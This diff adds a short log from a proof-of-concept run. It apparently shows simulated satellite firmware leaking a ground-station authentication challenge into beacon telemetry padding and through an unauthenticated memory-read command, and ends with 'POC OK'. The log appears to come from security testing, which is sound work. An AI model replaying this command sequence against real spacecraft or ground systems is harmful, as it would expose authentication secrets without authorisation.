@@ -1,0 +1,20 @@
+[   0.000] ========================================================================
+[   0.000] V-04 RAM leak in TM padding
+[   0.000] ========================================================================
+[   0.000] --> TC apid=0x05 via=usb AES  payload=01
+[   0.000] --> TC apid=0x21 via=radio AES  payload=01
+[   0.001] <-- TM apid=0x21 clear len=6
+[   0.001] --> TC apid=0x12 via=radio AES  payload=00
+[   0.001] <-- TM apid=0x12 AES len=13
+[   0.001] GS challenge generated: 0x1F26789C (firmware also copies it into the RAM string pool)
+[   0.001] --> advance(1500 ms)
+[   0.003] <-- TM apid=0x01 AES len=64
+[   0.004] <-- TM apid=0x01 AES len=64
+[   0.004] beacon padding bytes: 1f26789c000000000000000000000000000000000000000000000000000000000000000000000000000000
+[   0.004] --> TC apid=0x19 via=radio AES  payload=002800201000
+[   0.004] <-- TM apid=0x19 clear len=23
+[   0.004] MEM_READ leak pool: 9c78261f000000000000000000000000
+[   0.004] => 43 secret-ish RAM bytes per beacon, no crash, no auth
+[   0.004] ========================================================================
+[   0.004] POC OK
+[   0.004] ========================================================================
